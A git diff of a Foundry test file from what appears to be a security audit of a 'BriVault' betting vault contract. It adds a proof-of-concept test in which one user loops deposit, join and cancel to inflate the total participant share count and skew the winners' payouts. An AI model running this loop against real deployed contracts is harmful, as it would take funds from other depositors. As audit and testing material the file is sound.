@@ -160,6 +160,7 @@ contract BriVaultAuditTest is Test {
         assertEq(expectedWin, winnerFinalBalance - winnerInitBalance);
     }
 
+//---------------SENT-----------------------
     function testDepositSendSharesToWrongAddress() public {
         uint256 depositAmount = 1 ether;
         uint256 expectedShares = briVault.convertToShares(depositAmount) * (10000 - participationFeeBsp) / 10000;
@@ -285,14 +286,17 @@ contract BriVaultAuditTest is Test {
         vm.prank(user2);
         briVault.cancelParticipation();
         assertEq(briVault.usersAddress(1), user2);
+        assertEq(briVault.stakedAsset(user2), 0);
+        assertEq(briVault.balanceOf(user2),0);
     }
 
 
-    function userCanManipulateTotalPartecipantSharesLoopingDepositAndCancelPartecipation() public {
+    function testUserCanManipulateTotalPartecipantSharesLoopingDepositAndCancelPartecipation() public {
         uint256 initialTotalShares = briVault.totalParticipantShares();
         assertEq(initialTotalShares, 0);
 
         uint256 depositAmount = 1 ether;
+        uint256 countryIdVoted = 3;
         uint256 expectedSharesForDeposit = briVault.convertToShares(depositAmount) *
          (10000 - participationFeeBsp) / 10000;
         
@@ -301,17 +305,51 @@ contract BriVaultAuditTest is Test {
             vm.startPrank(user1);
             mockToken.approve(address(briVault), depositAmount);
             briVault.deposit(depositAmount, user1);  
-            briVault.joinEvent(1); 
+            briVault.joinEvent(countryIdVoted); 
             briVault.cancelParticipation();
             vm.stopPrank();
         }
         vm.startPrank(user1);
         mockToken.approve(address(briVault), depositAmount);
         briVault.deposit(depositAmount, user1);  
-        briVault.joinEvent(1); 
+        briVault.joinEvent(countryIdVoted); 
         vm.stopPrank();
-        //check shares effettive siano  giuste
-        //check totalPartecipantShares è sbagliato
+
+        //User1 exploited the bug to make it appear as if they held 6× more shares than their actual balance.
+        assertEq(briVault.userSharesToCountry(user1,countryIdVoted), expectedSharesForDeposit /* * (loopIterations + 1)*/ );
+        assertEq(briVault.totalParticipantShares(), expectedSharesForDeposit * (loopIterations ));
+        assertEq(briVault.balanceOf(user1), expectedSharesForDeposit);
+
+        vm.startPrank(user2);
+        mockToken.approve(address(briVault), depositAmount);
+        briVault.deposit(depositAmount, user2);  
+        briVault.joinEvent(countryIdVoted); 
+        vm.stopPrank();
+
+        //user1 and 2 has same amount of shares, should receive same amount of tokens due to vitory
+        //assertEq(briVault.balanceOf(user1), briVault.balanceOf(user2));
+
+        vm.warp(briVault.eventEndDate() +1);
+        vm.prank(owner);
+        briVault.setWinner(countryIdVoted);
+
+        uint256 user1TokenBalanceBeforeWithdraw = mockToken.balanceOf(user1);
+        uint256 user2TokenBalanceBeforeWithdraw = mockToken.balanceOf(user2);
+
+        vm.prank(user1);
+        briVault.withdraw();
+        vm.prank(user2);
+        briVault.withdraw();
+
+        uint256 user1WithdrawAmount = mockToken.balanceOf(user1) - user1TokenBalanceBeforeWithdraw;
+        uint256 user2WithdrawAmount = mockToken.balanceOf(user2) - user2TokenBalanceBeforeWithdraw;
+
+        //assertEq(user1WithdrawAmount,user2WithdrawAmount, "mismatch on balances");
+        console.log("user1 withdraw amount: ", user1WithdrawAmount);
+        console.log("user2 withdraw amount: ", user2WithdrawAmount);
+
+
+        //aggiornare in cancelPartecipation il totalPartecipationShares
     }
 
 
